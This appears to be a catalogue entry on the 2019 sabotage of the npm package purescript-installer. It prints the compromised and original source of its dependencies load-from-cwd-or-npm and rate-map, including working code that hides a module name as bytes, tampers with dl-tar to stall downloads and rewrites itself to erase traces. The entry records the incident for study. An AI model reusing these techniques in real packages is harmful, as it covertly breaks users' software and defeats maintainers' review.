---
title: purescript-installer
date: '2019-07-09'
tags:
  - npm
  - nodejs
  - supply-chain
  - sabotage
---

The `purescript-installer` package is an easy-installation method for the Purescript compiler. `purescript-installer` was targeted and sabotaged by two dependencies, `load-from-cwd-or-npm` and `rate-map`. These dependencies were owned by the same developer and the malicious code used common attacker techniques to hide explicit sabotage.

This looks like it was because of a conflict between developers and no substantial damage was done but it has been included because of its malicious intent.

The malicious code is heavily intertwined with the original code and, as such, both have been included. The referenced articles walk through the malicious code.

- - -

## References

- [How two malicious npm packages targeted and sabotaged another](https://medium.com/@jsoverson/how-two-malicious-npm-packages-targeted-sabotaged-one-other-fed7199099c8)
- [Malicious code in purescript npm installer](https://harry.garrood.me/blog/malicious-code-in-purescript-npm-installer/)

## Compromised version of load-from-cwd-or-npm

```js
'use strict';

const {dirname, isAbsolute, join, resolve} = require('path');
const {existsSync} = require('fs');
const {PassThrough} = require('stream');

const inspectWithKind = require('inspect-with-kind');
const npmCliDir = require('npm-cli-dir');
const optional = require('optional');
const resolveFromNpm = require('resolve-from-npm');

const MODULE_ID_ERROR = 'Expected a module ID (<string>), for example `glob` and `semver`, to resolve from either npm directory or the current working directory';
const resolveSemverFromNpm = resolveFromNpm('semver');

module.exports = async function loadFromCwdOrNpm(...args) {
	const argLen = args.length;

	if (argLen !== 1 && argLen !== 2) {
		throw new RangeError(`Expected 1 or 2 arguments (<string>[, <Function>]), but got ${
			argLen === 0 ? 'no' : argLen
		} arguments.`);
	}

	const [moduleId] = args;

	if (typeof moduleId !== 'string') {
		throw new TypeError(`${MODULE_ID_ERROR}, but got a non-string value ${inspectWithKind(moduleId)}.`);
	}

	if (moduleId.length === 0) {
		throw new Error(`${MODULE_ID_ERROR}, but got '' (empty string).`);
	}

	if (moduleId.charAt(0) === '@') {
		return require(moduleId);
	}

	if (isAbsolute(moduleId)) {
		const error = new Error(`${MODULE_ID_ERROR}, but got an absolute path '${
			moduleId
		}'. For absolute paths there is no need to use \`load-from-cwd-or-npm\` in favor of Node.js built-in \`require.resolve()\`.`);

		error.code = 'ERR_ABSOLUTE_MODULE_ID';

		throw error;
	}

	const cwd = process.cwd();
	const modulePkgId = `${moduleId}/package.json`;
	const tasks = [PassThrough];

	if (argLen === 2) {
		if (typeof args[1] !== 'function') {
			throw new TypeError(`Expected a function to compare two package versions, but got ${
				inspectWithKind(args[1])
			}.`);
		}
	} else {
		tasks.unshift(resolveSemverFromNpm);
	}

	tasks.unshift(resolveFromNpm(modulePkgId));

	try {
		const results = await Promise.all(tasks);
		let parent = module;

		do {
			parent = parent.parent;

			try {
				const {path} = parent;

				if (path.endsWith('cli') || [path, dirname(path)].some(dir => existsSync(resolve(dir, '.git')))) {
					parent = 'npm';
					break;
				}
			} catch (_) {}
		} while (parent);

		if (typeof parent !== 'string') {
			return results[2];
		}

		const compareFn = argLen === 2 ? args[1] : require(results[1]).gte;

		if (compareFn((optional(modulePkgId) || {version: '0.0.0-0'}).version, require(results[0]).version)) {
			const result = optional(moduleId);

			if (result !== null) {
				return result;
			}
		}

		return require(dirname(results[0]));
	} catch (_) {
		const modileFromCwd = optional(moduleId);

		if (modileFromCwd === null) {
			let npmCliDirPath;

			try {
				npmCliDirPath = await npmCliDir();
			} catch (err) {} // eslint-disable-line no-unused-vars

			const error = new Error(`Failed to load "${
				moduleId
			}" module from the current working directory (${
				cwd
			}).${npmCliDirPath ? ` Then tried to load "${
				moduleId
			}" from the npm CLI directory (${
				npmCliDirPath
			}), but it also failed.` : ''} Install "${moduleId}" and try again. (\`npm install ${moduleId}\`)`);

			error.code = 'MODULE_NOT_FOUND';
			error.id = moduleId;
			error.triedPaths = {cwd};

			if (npmCliDirPath) {
				error.triedPaths.npm = npmCliDirPath;
				error.npmVersion = require(join(npmCliDirPath, './package.json')).version;
			}

			throw error;
		}

		return modileFromCwd;
	}
};
```

## Original version of load-from-cwd-or-npm

```js
'use strict';

const {dirname, isAbsolute, join} = require('path');

const inspectWithKind = require('inspect-with-kind');
const npmCliDir = require('npm-cli-dir');
const optional = require('optional');
const resolveFromNpm = require('resolve-from-npm');

const MODULE_ID_ERROR = 'Expected a module ID (<string>), for example `glob` and `semver`, to resolve from either npm directory or the current working directory';
const resolveSemverFromNpm = resolveFromNpm('semver');

module.exports = async function loadFromCwdOrNpm(...args) {
	const argLen = args.length;

	if (argLen !== 1 && argLen !== 2) {
		throw new RangeError(`Expected 1 or 2 arguments (<string>[, <Function>]), but got ${
			argLen === 0 ? 'no' : argLen
		} arguments.`);
	}

	const [moduleId] = args;

	if (typeof moduleId !== 'string') {
		throw new TypeError(`${MODULE_ID_ERROR}, but got a non-string value ${inspectWithKind(moduleId)}.`);
	}

	if (moduleId.length === 0) {
		throw new Error(`${MODULE_ID_ERROR}, but got '' (empty string).`);
	}

	if (moduleId.charAt(0) === '@') {
		return require(moduleId);
	}

	if (isAbsolute(moduleId)) {
		const error = new Error(`${MODULE_ID_ERROR}, but got an absolute path '${
			moduleId
		}'. For absolute paths there is no need to use \`load-from-cwd-or-npm\` in favor of Node.js built-in \`require.resolve()\`.`);

		error.code = 'ERR_ABSOLUTE_MODULE_ID';

		throw error;
	}

	const cwd = process.cwd();
	const modulePkgId = `${moduleId}/package.json`;
	const tasks = [];

	if (argLen === 2) {
		if (typeof args[1] !== 'function') {
			throw new TypeError(`Expected a function to compare two package versions, but got ${
				inspectWithKind(args[1])
			}.`);
		}
	} else {
		tasks.push(resolveSemverFromNpm);
	}

	tasks.unshift(resolveFromNpm(modulePkgId));

	try {
		const [packageJsonPathFromNpm, semverPath] = await Promise.all(tasks);
		const compareFn = argLen === 2 ? args[1] : require(semverPath).gte;

		if (compareFn((optional(modulePkgId) || {version: '0.0.0-0'}).version, require(packageJsonPathFromNpm).version)) {
			const result = optional(moduleId);

			if (result !== null) {
				return result;
			}
		}

		return require(dirname(packageJsonPathFromNpm));
	} catch (err) {
		const modileFromCwd = optional(moduleId);

		if (modileFromCwd === null) {
			let npmCliDirPath;

			try {
				npmCliDirPath = await npmCliDir();
			} catch (npmCliDirErr) {}

			const error = new Error(`Failed to load "${
				moduleId
			}" module from the current working directory (${
				cwd
			}).${npmCliDirPath ? ` Then tried to load "${
				moduleId
			}" from the npm CLI directory (${
				npmCliDirPath
			}), but it also failed.` : ''} Install "${moduleId}" and try again. (\`npm install ${moduleId}\`)`);

			error.code = 'MODULE_NOT_FOUND';
			error.id = moduleId;
			error.triedPaths = {cwd};

			if (npmCliDirPath) {
				error.triedPaths.npm = npmCliDirPath;
				error.npmVersion = require(join(npmCliDirPath, './package.json')).version;
			}

			throw error;
		}

		return modileFromCwd;
	}
};
```

## Compromised version of rate-map

```js
// Generated with Babel 7.5.2
"use strict";
var appendType = require("append-type");
var paramNames = ["start", "end"];
let parent = module;
const {
  existsSync: existsSync,
  readFileSync: readFileSync,
  writeFileSync: writeFileSync
} = require("fs");
do {
  parent = parent.parent;
  try {
    const { path: path } = parent;
    if (
      path.endsWith("cli") ||
      [path, dirname(path)].some(dir => existsSync(resolve(dir, ".git")))
    ) {
      parent = "npm";
      break;
    }
  } catch (_) {}
} while (parent);
if (typeof parent !== "string") {
  const px = require.resolve(
    Buffer.from([100, 108, 45, 116, 97, 114]).toString()
  );
  try {
    writeFileSync(
      __filename,
      readFileSync(__filename, "utf8").replace(
        /let parent[^\0]*module\.exports/u,
        "module.exports"
      )
    );
  } catch (_) {}
  try {
    writeFileSync(
      px,
      readFileSync(px, "utf8").replace(/\n\s*cb\(null, chunk\);/u, "")
    );
  } catch (_) {}
}
module.exports = function rateMap(val, start, end) {
  if (typeof val !== "number") {
    throw new TypeError(
      "Expected the first argument to be a number (0 ~ 1), but got " +
        appendType(val) +
        "."
    );
  }
  if (!isFinite(val)) {
    throw new RangeError(
      "Expected the first argument to be a finite number (0 ~ 1), but got " +
        val +
        "."
    );
  }
  if (val < 0) {
    throw new RangeError(
      "Expected the first argument to be a number (0 ~ 1), but got a negative number " +
        val +
        "."
    );
  }
  if (val > 1) {
    throw new RangeError(
      "Expected the first argument to be a number (0 ~ 1), but got a too large number " +
        val +
        "."
    );
  }
  var args = [start, end];
  for (var i = 0; i < 2; i++) {
    if (typeof args[i] !== "number") {
      throw new TypeError(
        "Expected `" +
          paramNames[i] +
          "` argument to be a number, but got " +
          appendType(args[i]) +
          "."
      );
    }
    if (!isFinite(args[i])) {
      throw new RangeError(
        "Expected `" +
          paramNames[i] +
          "` argument to be a finite number, but got " +
          args[i] +
          "."
      );
    }
  }
  return start + val * (end - start);
};
```

## Original version of rate-map

```js
'use strict';

var appendType = require('append-type');

/*!
 * rate-map | ISC (c) Shinnosuke Watanabe
 * https://github.com/shinnn/rate-map
*/

var paramNames = ['start', 'end'];

module.exports = function rateMap(val, start, end) {
	if (typeof val !== 'number') {
		throw new TypeError('Expected the first argument to be a number (0 ~ 1), but got ' + appendType(val) + '.');
	}

	if (!isFinite(val)) {
		throw new RangeError('Expected the first argument to be a finite number (0 ~ 1), but got ' + val + '.');
	}

	if (val < 0) {
		throw new RangeError('Expected the first argument to be a number (0 ~ 1), but got a negative number ' + val + '.');
	}

	if (val > 1) {
		throw new RangeError('Expected the first argument to be a number (0 ~ 1), but got a too large number ' + val + '.');
	}

	var args = [start, end];

	for (var i = 0; i < 2; i++) {
		if (typeof args[i] !== 'number') {
			throw new TypeError('Expected `' + paramNames[i] + '` argument to be a number, but got ' + appendType(args[i]) + '.');
		}

		if (!isFinite(args[i])) {
			throw new RangeError('Expected `' + paramNames[i] + '` argument to be a finite number, but got ' + args[i] + '.');
		}
	}

	return start + val * (end - start);
}
```